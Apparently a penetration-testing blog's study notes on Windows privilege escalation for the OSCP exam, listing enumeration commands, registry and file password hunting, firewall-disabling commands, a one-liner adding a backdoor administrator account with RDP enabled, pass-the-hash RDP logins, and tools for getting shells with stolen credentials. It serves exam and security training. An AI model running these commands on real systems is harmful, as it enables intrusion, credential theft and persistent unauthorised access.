<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="Checklist - Local Windows Privilege Escalation Checklist - Local Windows Privilege Escalation
 Resources List  Hackticks - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Sushant 747&amp;rsquo;s Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html   Initial Enumeration System Enumeration   Read More here (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#windows-version-and-configuration)
  Enumerating System to find out the system version and running processes."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/notes/win-priv-esc/><title>Notes : Windows Privilege Escalation for OSCP & Beyond :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="Notes : Windows Privilege Escalation for OSCP & Beyond"><meta itemprop=description content="Checklist - Local Windows Privilege Escalation Checklist - Local Windows Privilege Escalation
 Resources List  Hackticks - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Sushant 747&rsquo;s Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html   Initial Enumeration System Enumeration   Read More here (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#windows-version-and-configuration)
  Enumerating System to find out the system version and running processes."><meta itemprop=datePublished content="2022-06-26T00:00:00+00:00"><meta itemprop=dateModified content="2022-06-26T00:00:00+00:00"><meta itemprop=wordCount content="1750"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Notes : Windows Privilege Escalation for OSCP & Beyond"><meta name=twitter:description content="Checklist - Local Windows Privilege Escalation Checklist - Local Windows Privilege Escalation
 Resources List  Hackticks - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Sushant 747&rsquo;s Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html   Initial Enumeration System Enumeration   Read More here (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#windows-version-and-configuration)
  Enumerating System to find out the system version and running processes."><meta property="og:title" content="Notes : Windows Privilege Escalation for OSCP & Beyond"><meta property="og:description" content="Checklist - Local Windows Privilege Escalation Checklist - Local Windows Privilege Escalation
 Resources List  Hackticks - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Sushant 747&rsquo;s Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html   Initial Enumeration System Enumeration   Read More here (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#windows-version-and-configuration)
  Enumerating System to find out the system version and running processes."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/notes/win-priv-esc/"><meta property="article:published_time" content="2022-06-26T00:00:00+00:00"><meta property="article:modified_time" content="2022-06-26T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2022-06-26 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>Security Blog</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/notes/win-priv-esc/>Notes : Windows Privilege Escalation for OSCP & Beyond</a></h2><div class=post-content><h3 id=checklist---local-windows-privilege-escalation>Checklist - Local Windows Privilege Escalation</h3><p><a href=https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation>Checklist - Local Windows Privilege Escalation</a></p><hr><h3 id=resources-list>Resources List</h3><ul><li>Hackticks - <a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation</a></li><li>Fuzzy Security Guide - <a href=https://www.fuzzysecurity.com/tutorials/16.html>https://www.fuzzysecurity.com/tutorials/16.html</a></li><li>PayloadsAllTheThings Guide - <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a></li><li>Absolomb Windows Privilege Escalation Guide - <a href=https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/>https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></li><li>Sushant 747&rsquo;s Guide (Country dependant - may need VPN) - <a href=https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html>https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a></li></ul><hr><h2 id=initial-enumeration>Initial Enumeration</h2><h3 id=system-enumeration>System Enumeration</h3><ul><li><p>Read More here (<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#windows-version-and-configuration>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#windows-version-and-configuration</a>)</p></li><li><p>Enumerating System to find out the system version and running processes.</p><ul><li>For Command Prompt</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>~# systeminfo
~# systeminfo | findstr /B /C:<span style=color:#e6db74>&#34;OS Name&#34;</span> /C:<span style=color:#e6db74>&#34;OS Version&#34;</span> /C:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>System Type
</span><span style=color:#e6db74>~# wmic qfe
</span><span style=color:#e6db74>~# wmic qfe get Caption,Description,HotFixID,InstalledOn
</span><span style=color:#e6db74>~# wmic logicaldisk get caption,description,providername
</span><span style=color:#e6db74>~# wmic qfe get Caption,Description,HotFixID,InstalledOn            #Patches
</span><span style=color:#e6db74>~# wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%      #Get system architecture
</span></code></pre></div><ul><li>For Powershell</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>~# <span style=color:#f92672>[</span>System.Environment<span style=color:#f92672>]</span>::OSVersion.Version                                                   <span style=color:#75715e>#Current OS version</span>
~# Get-WmiObject -query <span style=color:#e6db74>&#39;select * from win32_quickfixengineering&#39;</span> | foreach <span style=color:#f92672>{</span>$_.hotfixid<span style=color:#f92672>}</span>    <span style=color:#75715e>#List all patches</span>
~# Get-Hotfix -description <span style=color:#e6db74>&#34;Security update&#34;</span>                                                 <span style=color:#75715e>#List only &#34;Security Update&#34; patches</span>
</code></pre></div></li></ul><h3 id=user-enumeration>User Enumeration</h3><ul><li>Read More here (<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#user-enumeration>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#user-enumeration</a>)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>~# whoami /priv
~# whoami /groups
~# net user
~# net user &lt;username&gt;
~# net user administrator
~# net localgroup &lt;user&gt;
</code></pre></div><h3 id=network-enumeration>Network Enumeration</h3><ul><li>Read More here (<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#network-enumeration>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#network-enumeration</a>)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>~# ipconfig /all
~# arp -a
~# route print
~# netstat -ano

<span style=color:#75715e>###  Firewall</span>

~# netsh firewall show state
~# netsh firewall show config
</code></pre></div><h3 id=processes--tasks-enumeration>Processes / Tasks Enumeration</h3><ul><li><p>Read More Here (<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---processes-enumeration-and-tasks>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#eop&mdash;processes-enumeration-and-tasks</a>)</p></li><li><p>What processes are running?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Select * from Win32_Process</span><span style=color:#e6db74>&#34;</span> | where {$_.Name <span style=color:#f92672>-notlike</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>svchost*</span><span style=color:#e6db74>&#34;</span>} | Select Name, Handle, @{Label=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Owner</span><span style=color:#e6db74>&#34;</span>;Expression={$_.GetOwner().User}} | ft -AutoSize
</code></pre></div></li><li><p>Which processes are running as &ldquo;system&rdquo;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>tasklist /v /fi <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>username eq system</span><span style=color:#e6db74>&#34;</span>
</code></pre></div></li><li><p>Do you have powershell magic?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>REG QUERY <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine</span><span style=color:#e6db74>&#34;</span> /v PowerShellVersion
</code></pre></div></li><li><p>List installed programs</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>Get-ChildItem <span style=color:#e6db74>&#39;C:\Program Files&#39;</span>, <span style=color:#e6db74>&#39;C:\Program Files (x86)&#39;</span> | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
</code></pre></div></li><li><p>List services</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>net start
wmic service list brief
tasklist /SVC
</code></pre></div></li><li><p>Enumerate scheduled tasks</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>schtasks /query /fo LIST 2&gt;nul | findstr TaskName
schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SYSTEM\|Task To Run</span><span style=color:#e6db74>&#34;</span> | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath <span style=color:#f92672>-notlike</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>\Microsoft*</span><span style=color:#e6db74>&#34;</span>} | ft TaskName,TaskPath,State
</code></pre></div></li><li><p>Startup tasks</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><span style=color:#e6db74>&#34;</span>
dir <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Documents and Settings\%username%\Start Menu\Programs\Startup</span><span style=color:#e6db74>&#34;</span>
</code></pre></div></li></ul><h3 id=password-hunting>Password Hunting</h3><ul><li>For more info Read (<a href=https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html>https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a>)</li><li>Looting For Passwords (<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#eop&mdash;looting-for-passwords</a>)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>findstr /si password *.txt *.ini *.config
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

<span style=color:#75715e>#Find all those strings in config files.</span>
dir /s *pass* <span style=color:#f92672>=</span><span style=color:#f92672>=</span> *cred* <span style=color:#f92672>=</span><span style=color:#f92672>=</span> *vnc* <span style=color:#f92672>=</span><span style=color:#f92672>=</span> *.config*

<span style=color:#75715e># Find all passwords in all files.</span>
findstr /spin <span style=color:#e6db74>&#34;password&#34;</span> *.*
findstr /spin <span style=color:#e6db74>&#34;password&#34;</span> *.*
</code></pre></div><ul><li>Searching for passwords in Registry</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># VNC</span>
reg query <span style=color:#e6db74>&#34;HKCU\Software\ORL\WinVNC3\Password&#34;</span>

<span style=color:#75715e># Windows autologin</span>
reg query <span style=color:#e6db74>&#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span>

<span style=color:#75715e># SNMP Paramters</span>
reg query <span style=color:#e6db74>&#34;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&#34;</span>

<span style=color:#75715e># Putty</span>
reg query <span style=color:#e6db74>&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span>

<span style=color:#75715e># Search for password in registry</span>
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
</code></pre></div><ul><li>Searching for passwords In Files</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>c:<span style=color:#ae81ff>\s</span>ysprep.inf
c:<span style=color:#ae81ff>\s</span>ysprep<span style=color:#ae81ff>\s</span>ysprep.xml
c:<span style=color:#ae81ff>\u</span>nattend.xml
%WINDIR%<span style=color:#ae81ff>\P</span>anther<span style=color:#ae81ff>\U</span>nattend<span style=color:#ae81ff>\U</span>nattended.xml
%WINDIR%<span style=color:#ae81ff>\P</span>anther<span style=color:#ae81ff>\U</span>nattended.xml

dir c:<span style=color:#ae81ff>\*</span>vnc.ini /s /b
dir c:<span style=color:#ae81ff>\*</span>ultravnc.ini /s /b
dir c:<span style=color:#ae81ff>\ </span>/s /b | findstr /si *vnc.ini

</code></pre></div><h3 id=antivirus-av-enumeration>Antivirus (AV) Enumeration</h3><ul><li>Read More About AV Enumeratin here (<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#antivirus&ndash;detections</a>)</li><li>Antivirus Bypassing Methods<ul><li>Bypassing Antivirus (<a href=https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html>https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html</a>)</li><li>AV Bypass : Hacktricks (<a href=https://book.hacktricks.xyz/windows-hardening/av-bypass>https://book.hacktricks.xyz/windows-hardening/av-bypass</a>)</li><li><strong>Bypassing Detection for a Reverse Meterpreter Shell (</strong><a href=https://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/>https://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/</a>)</li></ul></li><li>AV Enumeration</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>
~# sc query windefend                                                                                                      <span style=color:#75715e>#Finding windows Defender</span>
~# sc queryex type<span style=color:#f92672>=</span> service                                                                                                <span style=color:#75715e>#To find out all services running ( may contain AV services as well)</span>
~# WMIC /Node:localhost /Namespace:<span style=color:#ae81ff>\\</span>root<span style=color:#ae81ff>\S</span>ecurityCenter2 Path AntivirusProduct Get displayName                            <span style=color:#75715e>#Enumeratiing AV on a box</span>
~# WMIC /Node:localhost /Namespace:<span style=color:#ae81ff>\\</span>root<span style=color:#ae81ff>\S</span>ecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more        <span style=color:#75715e>#Enumeratiing AV on a box</span>
~# Get-MpComputerStatus 
</code></pre></div><h3 id=firewall-enumeration>Firewall Enumeration</h3><ul><li><p>Read More here (<a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#firewall-rules>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#firewall-rules</a>)</p></li><li><p>Check out PayloadAllThings as well (<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#firewall>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#firewall</a>)</p></li><li><p>List firewall state and current configuration</p></li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>netsh advfirewall firewall dump
<span style=color:#75715e># or </span>
netsh firewall show state
netsh firewall show config
</code></pre></div><ul><li>List firewall&rsquo;s blocked ports</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>0</span><span style=color:#e6db74>&#34;</span>} | select name,applicationname,localports
</code></pre></div><ul><li>Disable firewall</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Disable Firewall on Windows 7 via cmd</span>
reg add <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server</span><span style=color:#e6db74>&#34;</span>  /v fDenyTSConnections /t REG_DWORD /d 0 /f

<span style=color:#75715e># Disable Firewall on Windows 7 via Powershell</span>
powershell.exe -ExecutionPolicy Bypass -command <span style=color:#e6db74>&#39;Set-ItemProperty -Path &#34;HKLM:\System\CurrentControlSet\Control\Terminal Server&#34; -Name &#34;fDenyTSConnections&#34; ‚ÄìValue&#39;</span>`

<span style=color:#75715e># Disable Firewall on any windows via cmd</span>
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off
</code></pre></div><ul><li>More Commands</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>netsh firewall show state <span style=color:#75715e># FW info, open ports</span>
netsh advfirewall firewall show rule name=all
netsh firewall show config <span style=color:#75715e># FW info</span>
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  <span style=color:#75715e>#Turn Off</span>
NetSh Advfirewall set allprofiles state on  <span style=color:#75715e>#Trun On</span>
netsh firewall set opmode disable <span style=color:#75715e>#Turn Off</span>

::How to open ports
netsh advfirewall firewall add rule name=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>NetBIOS UDP Port 138</span><span style=color:#e6db74>&#34;</span> dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>NetBIOS TCP Port 139</span><span style=color:#e6db74>&#34;</span> dir=<span style=color:#66d9ef>in</span> action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Remote Desktop</span><span style=color:#e6db74>&#34;</span> 

::Enable Remote Desktop
reg add <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><span style=color:#e6db74>&#34;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Remote Desktop</span><span style=color:#e6db74>&#34;</span>
::netsh firewall set service remotedesktop enable <span style=color:#75715e>#I found that this line is not needed</span>
::sc config TermService start= auto <span style=color:#75715e>#I found that this line is not needed</span>
::net start Termservice <span style=color:#75715e>#I found that this line is not needed</span>

::Enable Remote assistance<span style=color:#960050;background-color:#1e0010>:</span>
reg add <span style=color:#960050;background-color:#1e0010>‚Äú</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<span style=color:#960050;background-color:#1e0010>‚Äù</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

::Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add &amp; net localgroup administrators hacker /add &amp; net localgroup <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Remote Desktop Users</span><span style=color:#e6db74>&#34;</span> hacker /add &amp; reg add <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><span style=color:#e6db74>&#34;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f &amp; reg add <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><span style=color:#e6db74>&#34;</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f &amp; netsh firewall add portopening TCP 3389 <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Remote Desktop</span><span style=color:#e6db74>&#34;</span> &amp; netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth<span style=color:#960050;background-color:#1e0010>:</span>b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
</code></pre></div><hr><h2 id=using-credentials-to-own-windows-boxes>Using Credentials to Own Windows Boxes</h2><blockquote><p>Suppose we have the Windows domain credentials , Then how we can validate these credentials and Pop a Shell.</p></blockquote><ul><li><p>To validate Credentials (Spray And Pray)</p><ul><li><strong>Metasploit‚Äôs smb_login</strong> : We can use metasploit‚Äôs <code>auxiliary/scanner/smb/smb_login</code> to validate the credentials.</li><li><strong>CrackMapExec :</strong> This is a fairly new tool that I‚Äôve fallen in love with lately. It‚Äôs written in Python and is extremely fast for testing credentials and launching attacks on a large number of hosts. You can get it from here: <a href=https://github.com/byt3bl33d3r/CrackMapExec>https://github.com/byt3bl33d3r/CrackMapExec</a></li></ul></li><li><p>Pop a Shell (Using Validated Credentials)</p><ul><li><strong>Metasploit psexec :</strong> The old classic. It‚Äôs actually been updated to take advantage of PowerShell if it‚Äôs present, but the underlying technique hasn‚Äôt changed, There is also <code>auxiliary/admin/smb/psexec_command</code> if you want to just run a single command. This module can also take a range of RHOSTS</li><li><strong>Winexe :</strong> An old *nix tool to execute Windows commands remotely. Built in to Kali or available <a href=https://sourceforge.net/projects/winexe/>here</a>. You can execute a single command or drop right into a command prompt.</li><li><strong>Psexec.py</strong> : Part of the incredibly awesome <a href=https://github.com/CoreSecurity/impacket>Impacket library</a>.</li><li><strong>SmbExec.py :</strong> Another Impacket script. This one is a bit ‚Äústealthier‚Äù as it doesn‚Äôt drop a binary on the target system.</li><li><strong><a href=http://WmiExec.py>WmiExec.py</a> :</strong> Yet another awesome Impacket script. Under the hood this one uses Windows Management Instrumentation (WMI) to launch a semi-interactive shell.</li><li><strong>CrackMapExec :</strong> You can also use CrackMapExec to execute commands on hosts by passing it the ‚Äú-x‚Äù parameter. Since it‚Äôs built on Impacket‚Äôs libraries, it‚Äôs basically doing the exact same thing as wmiexec.py, but let‚Äôs you do it across a range of IPs.</li><li><strong>Using Remote Desktop :</strong> You can use Impacket‚Äôs <code>rdp_check</code> to see if you have RDP access, then use Kali‚Äôs <code>rdesktop</code> to connect.</li><li><strong>Other Methods</strong> :<ul><li>Besides executing commands, you can RDP (as seen above), or mount SMB shares using <code>smbclient</code> and download/upload files arbitrarily.</li><li>Use these methods to execute a post-exploitation toolkit, like Powershell Empire or a Meterpreter payload. These are just your ‚Äúfoot in the door‚Äù.</li></ul></li></ul></li><li><p>To learn More Read these Blogs</p><ul><li><a href=https://blog.ropnop.com/using-credentials-to-own-windows-boxes/>Using Credentials to Own Windows Boxes - Part 1 (from Kali)</a></li><li><a href=https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/>Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)</a></li><li><a href=https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/>Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM)</a></li><li><a href=https://book.hacktricks.xyz/windows-hardening/ntlm/psexec-and-winexec>https://book.hacktricks.xyz/windows-hardening/ntlm/psexec-and-winexec</a></li></ul></li></ul><hr><h2 id=exploring-windows-privesc-automated-tools>Exploring Windows PrivEsc Automated Tools</h2><h3 id=executables>Executables</h3><ul><li>WinPEAS - <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a></li><li>Seatbelt - <a href=https://github.com/GhostPack/Seatbelt>https://github.com/GhostPack/Seatbelt</a></li><li>Watson - <a href=https://github.com/rasta-mouse/Watson>https://github.com/rasta-mouse/Watson</a></li><li>SharpUp - <a 